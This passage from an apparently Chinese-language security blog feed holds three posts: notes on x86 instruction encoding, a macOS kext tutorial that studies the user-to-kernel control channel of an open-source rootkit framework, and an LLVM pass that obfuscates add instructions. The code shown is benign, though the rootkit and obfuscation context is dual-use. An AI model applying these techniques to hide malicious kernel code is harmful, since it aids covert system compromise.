    <content type="html"><![CDATA[<blockquote><p>由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。</p></blockquote><h3 id="x86指令编码格式"><a href="#x86指令编码格式" class="headerlink" title="x86指令编码格式"></a>x86指令编码格式</h3><p>很多时候我们都是查阅指令参考页去了解一个指令的含义，但这并不能理解指令的编码格式。而只有学会看懂opcode表的时候才是王道。</p><p>x86是一种CISC指令集，CISC的全称是“Complex Instruction Set Computer”，表示的是一种复杂的指令集，其中一个最重要的复杂性在于在这个指令集中，指令是不定长的，要使得CPU在这种不定长的指令集里面确定每一条指令的含义，就需要一种特定的指令格式，下图显示了<code>Intel 64</code>和<code>IA-32</code>架构下的指令格式，当然，这两种架构所采用的都是x86指令编码：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E6%A0%BC%E5%BC%8F.png?raw=true" alt="指令编码格式"></p><p>从上面可以看出，x86指令格式中，由6部分组成，但在这之中只有opcode是必须的，其余都是可选。我们稍后就介绍这些组成部分。</p><h3 id="指令prefix"><a href="#指令prefix" class="headerlink" title="指令prefix"></a>指令prefix</h3><p>prefix简单的说来就是调整内存操作数属性，增强指令的作用等。</p><ul><li><p><code>lock</code> 和 <code>repeat</code></p><p>其中，LOCK prefix保证该条指令对共享内存的访问是独占的；而repeat prefixes 表示这条指令会重复执行多次，直到某个条件满足位置。其中第二种repeat prefix只能用在对string的操作，或者对I/O的操作上。</p></li><li><p><code>operand-size override</code> （<strong>66H </strong>— 改变默认操作数大小）</p><p>这个prefix主要是在解析指令的操作数的时候，可以在十六位或者三十二位的操作数大小间进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/operand_size_override.png?raw=true" alt="operand_size_override"></p></li><li><p><code>address-size override</code> （<strong>67H</strong> — 改变默认操作数地址大小）</p><p>这个prefix主要是在进行指令寻址的时候，可以在十六位或者三十二位的地址大小中进行切换。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/address_override.png?raw=true" alt="address_override"></p></li><li><p><code>segment override</code>，<code>branch hints</code> 和 <code>bound</code></p><p>其中，segment override prefix会在执行这条指令的时候将默认的段寄存器给换掉；branch hints prefix主要应用在条件跳转指令（Jcc）中，可以协助CPU进行指令的prefetch；而bound prefix主要是用intel MPX硬件特性上。</p><p>​</p><p>| 2E          | 3E          | 26          | 64          | 65          | 36          |<br>| ———– | ———– | ———– | ———– | ———– | ———– |<br>| CS register | DS register | ES register | FS register | GS register | SS register |</p></li></ul><h4 id="REX-prefix—开启-64-位计算的基石"><a href="#REX-prefix—开启-64-位计算的基石" class="headerlink" title="REX prefix—开启 64 位计算的基石"></a>REX prefix—开启 64 位计算的基石</h4><p>REX prefix 是不定值，它的取值范围是：40 - 4F （共 16 个）</p><table><thead><tr><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>0</td><td>0</td><td>W</td><td>R</td><td>X</td><td>B</td></tr></tbody></table><ul><li>W: operand width 标志位，当 W = 0 时使用 default operand size,当 W = 1 时使用 64 位 operand size</li><li>R: 用来扩展 ModRM.reg 域</li><li>X: 用来扩展 SIB.index 域</li><li>B: 用来扩展 SIB.base, ModRM.r/m 以及 Opcode.reg</li></ul><h5 id="寄存器编码表"><a href="#寄存器编码表" class="headerlink" title="寄存器编码表"></a>寄存器编码表</h5><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/X86%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A0%81%E7%AC%94%E8%AE%B0/register_table.png?raw=true" alt="register_table"></p><p>下面来分析这条指令：</p><p><code>mov eax,ebx</code></p><p>正常编码为：<code>89 d8</code>  下面看看在不同的<code>REX.W</code>和<code>66H prefix</code>下的不同：</p><ul><li><p><code>48 89 d8</code>——————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 48 89 d8</code>—————&gt; <code>mov rax,rbx</code></p></li><li><p><code>66 40 89 d8</code>—————&gt; <code>mov ax, bx</code></p><p>​</p></li></ul><p>第 1 条指令编码使用 REX prefix 扩展访问 64 位寄存器，<strong>REX.W = 1</strong></p><p>第 2 条指令编码加上了 <strong>66H prefix</strong> 同时还有 REX prefix（<strong>REX.W = 1</strong>），此时一般会认为产生了冲突：是使用 64 位还是 16 位 operand size 呢？<br>实际上，很简单！<strong>48H 位于 66H 后面，66H 将被覆盖！</strong>也就是说：66H prefix 将会被忽略，REX prefix 产生了作用！因此：指令的 <strong>operand size 是 64 位</strong>的。</p><p>第 3 条指令编码也同样使用了 <strong>66H prefix </strong>和 <strong>REX prefix</strong>，但是 <strong>REX.W = 0</strong> 意味着不改变原来的 operand size！<br>在这种情况下，<strong>REX prefix 不会与 66H prefix 产生冲突</strong>，最终的作用于 66H prefix，因此 <strong>operand size 是 16 位</strong>的。</p><h3 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h3><p>整个编码中opcode是必须的，因为代表着这条指令的含义，整个指令的核心，且prefix与Opcode共享00~FF的空间。</p><p>一个opcode可以由一个byte组成，我们称之为<code>1-byte opcode</code>，当然，与之对应的，就有<code>2-bytes opcode</code>和<code>3-bytes opcode</code>。其中，后两者一般会有一个被称为<code>escape opcode</code>的byte进行引导，该byte的数值是<code>0FH</code>。所以，一般情况下，<code>2-bytes opcode</code>就是<code>0FH</code>后面再加一个byte，而<code>3-bytes opcode</code>就是<code>0FH</code>后面再加两个bytes。</p><h3 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h3><p>ModRM在指令中非常重要，是理解x86平台opcode的关键，决定着寻址模式。</p><p>由一个byte组成，其格式如下：</p><table><thead><tr><th>7 6</th><th>5 4 3</th><th>2 1 0</th></tr></thead><tbody><tr><td>mod</td><td>reg</td><td>R/M</td></tr></tbody></table><p><strong>1、mod：寻址模式。</strong><br>　　2位组成4种寻址模式，总的来说，只有两种寻址模式，就是：内存寻址模式和寄存器寻址模式。</p><ul><li>mod = 11指出寄存器寻址模式，mod = 00 ~ 10 时指出内存寻址模式：</li></ul><ul><li>mod = 00，定义 [register] 间接寻址，无displacement值。</li><li>mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。</li><li>mod = 10，定义 [register + disp32]，有32位displacement偏移值。</li></ul><p><strong>2、reg：寄存器ID值</strong><br>　　3位组成8个寄存器ID值，从 000 ~ 111，对应于 RAX、RCX、RDX、RBX、RSP、RBP、RSI以及RDI。这个ID值可以被REX prefix扩充为4位，范围从 0000 ~ 1111可表示16个寄存器。</p><p>reg域的另一含义是对Opcode的补充，对分为一组Opcode的进行选择（Group属性）。</p><p><strong>3、r/m：意即register / memory。</strong></p><p>​     提供对registers或memory的寻址，也用来表示寄存器ID，当是registers时是寄存器ID值。当是memory时是寄存器间接寻址中的寄存器ID值。当mod != 11 时，r/m 表示 [rax] ~ [rdi]，REX prefix用来扩充寄存器ID值。</p><blockquote><p>注意:</p><p>(1) 如果像这条指令：mov eax, [eax+ecx<em>2+0x0c] 在这条指令里eax是base寄存器，ecx是Index寄存器，2是scale，还有一个displacement ,这种内存寻址是base+index</em>scale+disp。这需要SIB字节来进行确定，那么ModRM必须要有一个手段来引出后续的SIB字节。在 [rax] ~ [rdi] 的范围里，Intel选择了原来应属于 [rsp] 的值用来引出SIB，一是因为 [rsp] 并不常用吧。二是因为 rsp 设计为 stack top指针，专用于stack top指针。<br>　　原来属于 [rsp] 的领域对应的，r/m是100，这个领域被 [SIB] 替代了，事实上在16位机器原本是没有SIB字节的，base+index*scale+disp这种寻址是后来才增加的。16位的ModRM上是没有SIB引导域。</p><p>(2)如果内存寻址中没有base和index，只有disp的话，如：mov ebx, [0x11223344]，这种直接寻址方式，在设计上ModRM还必须为提供这个模式。<br>　　Intel又作出修改，选择了原来属于 [rbp] 模式的领域提供给 [disp]，选择 [rbp] 让给 [disp]，是因为 rbp 原本意图就是设计为 stack基址指针。[rbp] 寻址一般都要加上一个偏移量，也就是基于stack frame指针的偏移量，即 [ebp + disp] 这种寻址模式在 mod = 01 或 mod = 10 中给出。</p></blockquote><h3 id="SIB"><a href="#SIB" class="headerlink" title="SIB"></a>SIB</h3><p>SIB意即：Scale – Index – Base，用来定义base+index*scale+disp这种寻址模式。同样按2-3-3比例组合。</p><table><thead><tr><th>7-6</th><th>5-4-3</th><th>2-1-0</th></tr></thead><tbody><tr><td>scale</td><td>index</td><td>base</td></tr></tbody></table><p>index 域指出index寄存器的ID值，范围从 000 ~ 111。base 域指出base寄存器的ID 值，从 000 ~ 111。Index与base经过 REX prefix可以扩展为0000 ~ 1111。</p><h3 id="Displacement-和-Immediate"><a href="#Displacement-和-Immediate" class="headerlink" title="Displacement 和 Immediate"></a>Displacement 和 Immediate</h3><p>某些指令会在最后要求有一个用于计算内存地址的值，或者一个立即数。很明显，不多说。</p><h3 id="综合起来，看下面的例子："><a href="#综合起来，看下面的例子：" class="headerlink" title="综合起来，看下面的例子："></a>综合起来，看下面的例子：</h3><ul><li><p><code>49 8b 7d 00</code></p><p>49=0100 1001对应REX prefix,默认64为size模式</p><p>8b= mov opcode</p><p>7d=01 111 101—&gt;ModR/M   mod = 01，定义 [register + disp8]，有8位displacemnet 偏移值。rdi ,r13</p><p>00=Displacement = 0</p><p>所以指令= mov rdi,QWORD PTR [r13+0]—&gt;mov rdi,[r13]</p><p>​</p></li></ul><h3 id="参考及索引"><a href="#参考及索引" class="headerlink" title="参考及索引"></a>参考及索引</h3><p><a href="http://ref.x86asm.net/coder32.html" target="_blank" rel="external">http://ref.x86asm.net/coder32.html </a>—-&gt; 查阅opcode</p><p><a href="http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png" target="_blank" rel="external">http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.png</a> —&gt;quick look</p><p><a href="http://sparksandflames.com/files/x86InstructionChart.html" target="_blank" rel="external">Intel x86 Assembler Instruction Set Opcode Table</a></p><p><a href="http://www.mouseos.com/x64/index.html" target="_blank" rel="external">http://www.mouseos.com/x64/index.html</a></p><p><a href="https://bbs.pediy.com/thread-78121.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-78121.htm</a></p><p><a href="http://ytliu.info/blog/2016/12/10/x86zhi-ling-bian-ma-de-na-xie-shi-er/" target="_blank" rel="external">X86指令编码的那些事儿</a></p><p><a href="http://subler.github.io/note/compiler/x86_instruction_encode.html" target="_blank" rel="external">http://subler.github.io/note/compiler/x86_instruction_encode.html</a></p><p><a href="https://www.onlinedisassembler.com/odaweb/strcpy_x86" target="_blank" rel="external">onlineDisassembler</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于重装系统同步导致原文章消失，只能再写一遍，方便以后查阅。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;x86指令编码格式&quot;&gt;&lt;a href=&quot;#x86指令编码格式&quot; class=&quot;headerlink&quot; title=&quot;x86指令编码格式
      
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="x86" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/x86/"/>
    
  </entry>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><pre><code>#include &lt;mach/mach_types.h&gt;#include &lt;libkern/libkern.h&gt;kern_return_t TestExtension_stop(kmod_info_t *ki, void *d);kern_return_t TestExtension_start(kmod_info_t * ki, void *d){    printf(&quot;hello kext!\n&quot;);    return KERN_SUCCESS;}kern_return_t TestExtension_stop(kmod_info_t *ki, void *d){    printf(&quot;bye kext!\n&quot;);    return KERN_SUCCESS;}</code></pre><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><pre><code>#include &lt;sys/systm.h&gt;#include &lt;mach/mach_types.h&gt;#include &lt;mach/kern_return.h&gt; #include &lt;sys/kern_control.h&gt;//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstruct kern_ctl_ref _ctlref ; kern_return_t start(kmod_info_t *info, void *data){    int err ;    struct kern_ctl_reg ctlreg ;    bzero(&amp;ctlreg, sizeof(ctlreg)) ;    //控制信息    ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */    ctlreg.ctl_unit = 0 ;    strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name));    //回调函数    ctlreg.ctl_connect_func = connect ;    ctlreg.ctl_disconnect_func = disconnect ;    ctlreg.ctl_send_func = send ;    ctlreg.ctl_getopt_func = getopt ;    ctlreg.ctl_setopt_func = setopt ;    //注册内核控制    err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;    if (err) return KERN_FAILURE ;    return KERN_SUCCESS ;}</code></pre><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><pre><code>struct kern_ctl_reg{    /* 控制信息 */    char        ctl_name[MAX_KCTL_NAME];    u_int32_t    ctl_id;    u_int32_t    ctl_unit;    /* 控制设置 */    u_int32_t    ctl_flags;    u_int32_t    ctl_sendsize;    u_int32_t    ctl_recvsize;    /* 回调函数 */    ctl_connect_func    ctl_connect;//建立连接时调用    ctl_disconnect_func    ctl_disconnect;//断开连接时调用    ctl_send_func    ctl_send;//处理从client到kernel的数据发送    ctl_setopt_func    ctl_setopt; //当client调用setsockopt时调用    ctl_getopt_func    ctl_getopt;//当client调用getsockopt时调用};</code></pre><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><pre><code>#include &lt;socket.h&gt;#include &lt;string.h&gt;#include &lt;sys/kern_control.h&gt;#include &lt;sys/ioctl.h&gt;char name[] = &quot;com.example.mymodule&quot; ;//标识这个kextstatic int g_socket = -1;u_int32_t getctlidbybame(int sock, char *name) ;//建立连接int socket_ctl(char *name){    int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;    if (g_sock == 0) return 0 ;    u_int32_t id = getctlidbyname(g_sock, name) ;    sockaddr_ctl addr ;    addr.sc_len = sizeof(addr) ;    addr.sc_family = AF_SYSTEM ;    addr.sc_sysaddr = AF_SYS_CONTROL ;    addr.sc_id = id ;    addr.sc_unit = 0 ; /* allocate dynamically */    int err ;    err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ;    if (err) return 0 ;    return sock ;}u_int32_t getctlidbybame(int sock, char *name){    struct ctl_info info ;    memset(&amp;info, 0, sizeof(info)) ;    strncpy(info.ctl_name, name, strlen(name)) ;    int err = ioctl(sock, CTLIOCGINGO, &amp;info) ;    if (err) return 0 ; /* should do something stronger here! */    return info.ctl_id ;}int main(int argc, const char *argv[]){        socket_ctl(name);}//发送数据void execute_cmd(int cmd, char *args){    char data[32] = { 0 };    size_t data_len = 0;    int retv;    if(args != NULL) {        memcpy(data, args, strlen(args));    }    data_len = strlen(data) + 1;    retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);    if(retv != 0) {        printf(&quot;[ERROR] Kernel command execution failed:\n&quot;);        printf(&quot;\t%s (%d)\n&quot;, strerror(errno), errno);        return;    }}//接收数据void get_data(){    char *data = malloc(32);    socklen_t data_len = 32;    int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len);    if(retv != 0) {        printf(&quot;[ERROR] getsockopt()\n&quot;);        return;    }    size_t r = recv(g_socket, data, data_len, 0);    if(r == 0) {        printf(&quot;[ERROR] recv()\n&quot;);        return;    }}</code></pre><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>初-LLVM的代码混淆</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E5%88%9D-LLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/06/25/初-LLVM的代码混淆/初-LLVM的代码混淆/</id>
    <published>2017-06-25T07:09:13.000Z</published>
    <updated>2019-02-21T09:55:50.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-目录"><a href="#0x00-目录" class="headerlink" title="0x00 目录"></a>0x00 目录</h2><blockquote><blockquote><p>断断续续的学习了一段时间的LLVM，记录下学习进度，随着后面的学习待更新</p></blockquote></blockquote><ul><li>LLVM简介</li><li>一个基于LLVM简单的代码混淆例子</li><li>参考链接</li></ul><h2 id="0x01-LLVM简介"><a href="#0x01-LLVM简介" class="headerlink" title="0x01 LLVM简介"></a>0x01 LLVM简介</h2><p>LLVM(low level virtual machine)是一个先进的编译器框架，它提供了一种代码编写良好的中间表示(IR)，可以作为多种语言的后端，还可以提供与变成语言无关的优化和针对多种cpu的代码生成功能。<br>LLVM的主要架构如下：</p><ul><li>前端：前端用来获取源代码然后将它转变为某种中间表示，我们可以选择不同的编译器来作为LLVM的前端，如gcc，clang。</li><li>Pass：Pass是LLVM优化工作的一个节点，一个节点做些事，一起加起来就构成了LLVM完整的优化和转化。</li><li>后端：后端用来生成实际的机器码，一般情况下不会关注这一部分。</li></ul><h3 id="LLVM框架："><a href="#LLVM框架：" class="headerlink" title="LLVM框架："></a>LLVM框架：</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-0.png?raw=true" alt="0-0"><br>这里与传统的编译器不同，LLVM采用了一种统一的中间表示：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-1.png?raw=true" alt="0-1"></p><h3 id="安装与使用"><a href="#安装与使用" class="headerlink" title="安装与使用"></a>安装与使用</h3><p>首先下载LLVM  </p><pre><code>$ cd where-you-want-llvm-to-live$ svn co http://llvm.org/svn/llvm-project/llvm/trunk llvm</code></pre><p>我们选择clang作为LLVM前端，然后下载clang  </p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/tools$ svn co http://llvm.org/svn/llvm-project/cfe/trunk clang</code></pre><p>下载编译运行库</p><pre><code>$ cd where-you-want-llvm-to-live$ cd llvm/projects$ svn co http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt</code></pre><p>最后编译LLVM源码</p><pre><code>$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE:String=Release ../llvm/$ make</code></pre><p>编译时间可能有点长，编译完成之后进行安装</p><pre><code>$sudo make install</code></pre><p>接下来就是LLVM的使用，先创建一个hello.c源文件</p><pre><code>#include &lt;stdio.h&gt;int main(){    printf(&quot;hello LLVM\n&quot;);    return 0;}</code></pre><h2 id="0x02-一个基于LLVM简单的代码混淆例子"><a href="#0x02-一个基于LLVM简单的代码混淆例子" class="headerlink" title="0x02 一个基于LLVM简单的代码混淆例子"></a>0x02 一个基于LLVM简单的代码混淆例子</h2><p>Pass是LLVM中一个很重要的部分，每个Pass都是做优化或者转换的工作，LLVM的优化和转换工作就是由很多个Pass一起完成的。我们通过继承指定的类以及实现相关的虚函数来实现具体的Pass，具体的类型主要有以下几种：  </p><ul><li>ImmutablePass</li><li>MoudlePass</li><li>CallGraphSCCPass</li><li>FuncationPass</li><li>LoopPass</li><li>RegionPass</li><li>BasicBlockPass</li><li>MachineFunctionPass</li></ul><p>下面这个例子来介绍一下pass的编写并达到简单的混淆。从这里下载这个模板<a href="https://github.com/NULL-ME/NULL-ME.github.io/tree/master/articlePic/LLVM/skeleton">llvm-pass-skeleton</a></p><p>下面是完整代码：</p><pre><code>#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;#include &quot;llvm/IR/LegacyPassManager.h&quot;#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;#include &quot;llvm/IR/Intrinsics.h&quot;#include &quot;llvm/IR/Instructions.h&quot;using namespace llvm;namespace {  struct SkeletonPass : public FunctionPass {    static char ID;    SkeletonPass() : FunctionPass(ID) {}    // virtual bool runOnFunction(Function &amp;F) {    //   errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\n&quot;;    //   return false;    // }    bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }        // a+b === a-(-b)        bool ob_add(BinaryOperator *bo) {            BinaryOperator *op = NULL;            if (bo-&gt;getOpcode() == Instruction::Add) {                // 生成 (－b)                op = BinaryOperator::CreateNeg(bo-&gt;getOperand(1), &quot;&quot;, bo);                // 生成 a-(-b)                op = BinaryOperator::Create(Instruction::Sub, bo-&gt;getOperand(0), op, &quot;&quot;, bo);                op-&gt;setHasNoSignedWrap(bo-&gt;hasNoSignedWrap());                op-&gt;setHasNoUnsignedWrap(bo-&gt;hasNoUnsignedWrap());            }            // 替换所有出现该指令的地方            bo-&gt;replaceAllUsesWith(op);        }  };}char SkeletonPass::ID = 0;// Automatically enable the pass.// http://adriansampson.net/blog/clangpass.htmlstatic void registerSkeletonPass(const PassManagerBuilder &amp;,                         legacy::PassManagerBase &amp;PM) {  PM.add(new SkeletonPass());}static RegisterStandardPasses  RegisterMyPass(PassManagerBuilder::EP_EarlyAsPossible,                 registerSkeletonPass);</code></pre><p>通过继承<code>FunctionPass</code>重写虚函数<code>runOnFunction</code>来到达我们代码混淆的目的，再看关键的混淆部分，如下面注释那样，找到函数中的add指令，并将其改为sub指令。如<code>a+b</code>经过混淆为<code>a-(-b)</code></p><pre><code>bool runOnFunction(Function &amp;F) override {            Function *tmp = &amp;F;            // 遍历函数中的所有基本块            for (Function::iterator bb = tmp-&gt;begin(); bb != tmp-&gt;end(); ++bb) {                // 遍历基本块中的每条指令                for (BasicBlock::iterator inst = bb-&gt;begin(); inst != bb-&gt;end(); ++inst) {                    // 是否是add指令                    if (inst-&gt;isBinaryOp()) {                        if (inst-&gt;getOpcode() == Instruction::Add) {                            ob_add(cast&lt;BinaryOperator&gt;(inst));                        }                    }                }            }            return false;        }</code></pre><p>代码很简单，这里就不多说。我们使用</p><pre><code>$clang -Xclang -load -Xclang build/skeleton/libSkeletonPass.* something.c</code></pre><p>来运行这个pass编译成目标可执行文件<br>现在我们创建一个addTest.c文件来测试是否代码混淆</p><pre><code>#include &lt;stdio.h&gt;int func(int a,int b){    return a + b;}int main(){    int c;    c = func(6,9);    printf(&quot;%d\n&quot;,c);    return c;}</code></pre><p>先按照一般的编译源代码，查看关键汇编代码：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-2.png?raw=true" alt="0-2"><br>然后运行我们的pass进行编译<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/LLVM/0-3.png?raw=true" alt="0-3"><br>很明显，汇编代码发生了改变，当然这里仅仅是一个简单的混淆，感兴趣的可以研究下<a href="https://github.com/obfuscator-llvm">obfuscator-llvm</a>这个项目。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="http://www.tuicool.com/articles/2meqIjq" target="_blank" rel="external">深入剖析 iOS 编译 Clang / LLVM</a><br><a href="http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/" target="_blank" rel="external">http://zke1ev3n.me/2016/01/18/%E5%9F%BA%E4%BA%8ELLVM%E7%9A%84%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-目录&quot;&gt;&lt;a href=&quot;#0x00-目录&quot; class=&quot;headerlink&quot; title=&quot;0x00 目录&quot;&gt;&lt;/a&gt;0x00 目录&lt;/h2&gt;&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;断断续续的学习了一段时间的LLVM，记录下学习进
      
    
    </summary>
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/LLVM/"/>
    
    
      <category term="LLVM" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLVM/"/>
    
      <category term="obfuscation" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/obfuscation/"/>
    
  </entry>
  
  <entry>
    <title>pwnhub-CTF re150</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/05/28/pwnhub-CTF-re150/pwnhub-CTF-re150/"/>
